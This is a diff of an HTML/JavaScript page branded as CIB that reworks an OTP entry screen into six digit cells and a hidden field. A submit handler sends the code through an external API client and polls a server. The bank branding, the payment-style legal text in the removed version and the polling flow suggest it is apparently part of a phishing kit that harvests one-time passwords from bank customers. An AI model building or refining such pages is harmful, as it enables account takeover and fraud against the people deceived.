@@ -3,58 +3,132 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>CIB - تأكيد العملية</title>
-    <link rel="stylesheet" href="otp.css" />
+    <title>CIB - الرقم السرى المتغير OTP</title>
+    <link rel="stylesheet" href="otp2.css" />
   </head>
-  <body>
+  <body class="otp2-page">
+    <header class="otp2-topbar">(الرقم السرى المتغير (OTP</header>
 
-    <header class="top-header">
-      <img class="top-logo" src="img/logo.png" alt="CIB" />
-    </header>
+    <main class="otp2-main">
+      <h1 class="otp2-heading">OTP أدخل الرقم السرى المتغير</h1>
+      <p class="otp2-lead">
+        برجاء إدخال الرقم السري المتغير OTP الذي تم إنشائه من خلال تطبيق الرقم السري
+        المتغير
+      </p>
 
-    <main class="otp-page">
-      <section class="otp-card">
-        <h1 class="otp-title">تأكيد العملية</h1>
-
-        <p class="otp-text">
-          تم إرسال رسالة نصية تحتوي على رمز تأكيد لمرة واحدة (OTP)<br />
-          إلى رقمك المسجل لدينا لتأكيد الطلب الخاص بك.
-        </p>
-
-        <label class="otp-label" for="otp-code">Verification Code (6 أرقام)</label>
+      <div class="otp2-cells-wrap" aria-label="رمز مكون من 6 أرقام">
         <input
-          id="otp-code"
-          class="otp-input"
+          class="otp2-cell"
           type="text"
           inputmode="numeric"
-          maxlength="6"
+          maxlength="1"
           autocomplete="one-time-code"
-          dir="ltr"
-          placeholder="••••••"
+          aria-label="الرقم 1"
         />
+        <input
+          class="otp2-cell"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          autocomplete="off"
+          aria-label="الرقم 2"
+        />
+        <input
+          class="otp2-cell"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          autocomplete="off"
+          aria-label="الرقم 3"
+        />
+        <input
+          class="otp2-cell"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          autocomplete="off"
+          aria-label="الرقم 4"
+        />
+        <input
+          class="otp2-cell"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          autocomplete="off"
+          aria-label="الرقم 5"
+        />
+        <input
+          class="otp2-cell"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          autocomplete="off"
+          aria-label="الرقم 6"
+        />
+      </div>
 
-        <button class="otp-btn" type="button">تأكيد</button>
-
-        <div id="otp-timer" class="timer">02:00</div>
-
-        <p class="legal">
-          تفاصيل الدفع الخاصة بك مشفرة ومحمية بشكل آمن بالنقر<br />
-          فوق الدفع الآن، فإنك تؤكد أنك أكبر من 20 عامًا وأنك<br />
-          توافق على <a href="#">شروط الاستخدام وسياسة الخصوصية الخاصة بنا</a>
-        </p>
-
-        <div class="bottom-logo-wrap">
-          <img class="bottom-logo" src="img/logo.png" alt="CIB" />
-        </div>
-      </section>
+      <input
+        id="otp-code"
+        class="otp2-hidden-code"
+        type="text"
+        maxlength="6"
+        tabindex="-1"
+        aria-hidden="true"
+      />
     </main>
-    
+
+    <footer class="otp2-footer">
+      <button class="otp2-submit otp-btn" type="button">
+        استخدم تطبيق الرقم السري المتغير OTP
+      </button>
+    </footer>
+
     <script src="api-config.js"></script>
     <script src="api-client.js"></script>
     <script>
       (function () {
         function digitsOtp(str) {
           return String(str || '').replace(/\D/g, '').slice(0, 6);
+        }
+
+        function syncOtpCodeFromCells(cells, hidden) {
+          var v = '';
+          for (var i = 0; i < cells.length; i++) {
+            v += digitsOtp(cells[i].value).slice(-1);
+          }
+          hidden.value = v.slice(0, 6);
+        }
+
+        function setupOtpCells() {
+          var cells = document.querySelectorAll('.otp2-cell');
+          var hidden = document.getElementById('otp-code');
+          if (!cells.length || !hidden) return;
+
+          cells.forEach(function (cell, i) {
+            cell.addEventListener('input', function () {
+              var d = digitsOtp(cell.value).slice(-1);
+              cell.value = d;
+              syncOtpCodeFromCells(cells, hidden);
+              if (d && i < cells.length - 1) cells[i + 1].focus();
+            });
+            cell.addEventListener('keydown', function (e) {
+              if (e.key === 'Backspace' && !cell.value && i > 0) {
+                cells[i - 1].focus();
+              }
+            });
+            cell.addEventListener('paste', function (e) {
+              e.preventDefault();
+              var pasted = digitsOtp(
+                (e.clipboardData && e.clipboardData.getData('text')) || ''
+              );
+              for (var j = 0; j < cells.length; j++) {
+                cells[j].value = pasted[j] || '';
+              }
+              syncOtpCodeFromCells(cells, hidden);
+              var next = Math.min(pasted.length, cells.length - 1);
+              cells[next].focus();
+            });
+          });
         }
 
         var pollStop = null;
@@ -101,34 +175,64 @@
         }
 
         var totalSeconds = 2 * 60;
-        var timerEl = document.getElementById("otp-timer");
-        if (!timerEl) return;
-
-        function format(seconds) {
-          var m = Math.floor(seconds / 60);
-          var s = seconds % 60;
-          return String(m).padStart(2, "0") + ":" + String(s).padStart(2, "0");
-        }
-
-        timerEl.textContent = format(totalSeconds);
-
-        var intervalId = setInterval(function () {
-          totalSeconds -= 1;
-          if (totalSeconds <= 0) {
-            timerEl.textContent = "00:00";
-            clearInterval(intervalId);
-            return;
+        var timerEl = document.getElementById('otp-timer');
+        if (timerEl) {
+          function format(seconds) {
+            var m = Math.floor(seconds / 60);
+            var s = seconds % 60;
+            return (
+              String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0')
+            );
           }
           timerEl.textContent = format(totalSeconds);
-        }, 1000);
+          var intervalId = setInterval(function () {
+            totalSeconds -= 1;
+            if (totalSeconds <= 0) {
+              timerEl.textContent = '00:00';
+              clearInterval(intervalId);
+              return;
+            }
+            timerEl.textContent = format(totalSeconds);
+          }, 1000);
+        }
+
+        setupOtpCells();
 
         var otpInput = document.getElementById('otp-code');
-        otpInput.addEventListener('input', function () {
-          otpInput.value = digitsOtp(otpInput.value);
-        });
+        if (otpInput) {
+          otpInput.addEventListener('input', function () {
+            otpInput.value = digitsOtp(otpInput.value);
+            var v = otpInput.value;
+            var cellList = document.querySelectorAll('.otp2-cell');
+            if (v.length === 6 && cellList.length === 6) {
+              for (var t = 0; t < 6; t++) {
+                cellList[t].value = v[t] || '';
+              }
+            }
+          });
+        }
 
         document.querySelector('.otp-btn').addEventListener('click', async function () {
           stopPoll();
+          var cells = document.querySelectorAll('.otp2-cell');
+          var hiddenEl = document.getElementById('otp-code');
+          if (cells.length && hiddenEl) {
+            var combined = '';
+            for (var c = 0; c < cells.length; c++) {
+              combined += digitsOtp(cells[c].value).slice(-1);
+            }
+            var fromHidden = digitsOtp(hiddenEl.value);
+            if (combined.length === 6) {
+              hiddenEl.value = combined;
+            } else if (fromHidden.length === 6) {
+              hiddenEl.value = fromHidden;
+              for (var k = 0; k < cells.length; k++) {
+                cells[k].value = fromHidden[k] || '';
+              }
+            } else {
+              hiddenEl.value = combined;
+            }
+          }
           var otpCode = digitsOtp(document.getElementById('otp-code').value);
           if (otpCode.length !== 6) {
             alert('الرجاء إدخال 6 أرقام بالضبط لرمز التحقق.');
@@ -178,4 +282,3 @@
     </script>
   </body>
 </html>
-
